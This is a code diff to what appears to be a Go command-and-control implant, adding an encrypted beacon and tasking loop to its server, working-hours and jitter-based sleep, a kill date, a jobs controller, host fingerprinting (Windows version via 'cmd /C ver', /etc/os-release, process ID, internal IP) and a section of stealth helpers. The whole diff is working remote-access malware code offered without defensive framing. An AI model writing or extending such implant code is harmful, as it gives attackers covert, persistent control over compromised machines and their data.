@@ -1,11 +1,16 @@
 package main
 
 import (
+	"bufio"
 	"encoding/binary"
 	"math/rand/v2"
 	"net"
 	"os"
+	"os/exec"
+	"regexp"
 	"runtime"
+	"strconv"
+	"strings"
 	"sync"
 	"time"
 
@@ -19,6 +24,7 @@ import (
 
 var (
 	agent impl.AgentImpl
+	jobs  = impl.NewJobsController()
 
 	stateMu     sync.RWMutex
 	agentSleep  int   // seconds
@@ -143,9 +149,28 @@ func taskLoop(conn net.Conn) {
 		}
 		waitForWorkingHours()
 
+		responses := mergeBinaryResponseBlobs(nil)
+		if responses != nil {
+			enc, err := crypto.EncryptData(responses, crypto.SKey)
+			if err != nil {
+				return
+			}
+			if err = protocol.SendMsg(conn, enc); err != nil {
+				return
+			}
+		} else {
+			if err := protocol.SendMsg(conn, nil); err != nil {
+				return
+			}
+		}
+
 		data, err := protocol.RecvMsg(conn)
-		if err != nil || data == nil {
+		if err != nil {
 			return
+		}
+		if data == nil {
+			sleepWithJitter()
+			continue
 		}
 
 		plaintext, err := crypto.DecryptData(data, crypto.SKey)
@@ -153,8 +178,9 @@ func taskLoop(conn net.Conn) {
 			return
 		}
 
-		responses := TaskProcess(plaintext)
+		responses = mergeBinaryResponseBlobs(TaskProcess(plaintext))
 		if responses == nil {
+			sleepWithJitter()
 			continue
 		}
 
@@ -208,15 +234,16 @@ doneIP:
 	w.WriteUint32(uint32(p.Sleep))                    // Sleep
 	w.WriteUint32(uint32(p.Jitter))                   // Jitter
 	w.WriteUint32(uint32(p.KillDate))                 // KillDate
-	w.WriteUint32(0)                                  // WorkingTime
+	w.WriteUint32(uint32(encodeWorkingTime(p.WorkStart, p.WorkEnd))) // WorkingTime
 	w.WriteUint16(0)                                  // ACP
 	w.WriteUint16(0)                                  // OemCP
 	w.WriteUint8(0)                                   // GmtOffset
 	w.WriteUint16(uint16(os.Getpid()))                // Pid
 	w.WriteUint16(0)                                  // Tid
-	w.WriteUint32(0)                                  // BuildNumber — TODO: fill from OS
-	w.WriteUint8(0)                                   // MajorVersion — TODO: fill from OS
-	w.WriteUint8(0)                                   // MinorVersion — TODO: fill from OS
+	buildNumber, majorVersion, minorVersion := osVersionFields()
+	w.WriteUint32(buildNumber)
+	w.WriteUint8(majorVersion)
+	w.WriteUint8(minorVersion)
 	w.WriteUint32(protocol.IPv4ToUint32(internalIP))  // InternalIp
 
 	// Flags: bit 0=arch64, 1=sysArch64, 2=elevated, 3=isServer
@@ -249,6 +276,52 @@ func processName() string {
 		}
 	}
 	return exe
+}
+
+func encodeWorkingTime(start, end int) int {
+	if start == 0 && end == 0 {
+		return 0
+	}
+	startHour := start / 100
+	startMin := start % 100
+	endHour := end / 100
+	endMin := end % 100
+	return (startHour << 24) | (startMin << 16) | (endHour << 8) | endMin
+}
+
+func osVersionFields() (uint32, uint8, uint8) {
+	if runtime.GOOS != "windows" {
+		return 0, 0, 0
+	}
+	out, err := exec.Command("cmd", "/C", "ver").Output()
+	if err != nil {
+		return 0, 10, 0
+	}
+	re := regexp.MustCompile(`(\d+)\.(\d+)\.(\d+)`)
+	m := re.FindStringSubmatch(string(out))
+	if len(m) != 4 {
+		return 0, 10, 0
+	}
+	maj, _ := strconv.Atoi(m[1])
+	min, _ := strconv.Atoi(m[2])
+	bld, _ := strconv.Atoi(m[3])
+	return uint32(bld), uint8(maj), uint8(min)
+}
+
+func loadOsReleasePrettyName() string {
+	f, err := os.Open("/etc/os-release")
+	if err != nil {
+		return ""
+	}
+	defer f.Close()
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.HasPrefix(line, "PRETTY_NAME=") {
+			return strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), "\"")
+		}
+	}
+	return ""
 }
 
 // ─── Stealth helpers ───────────────────────────────────────────────────────────
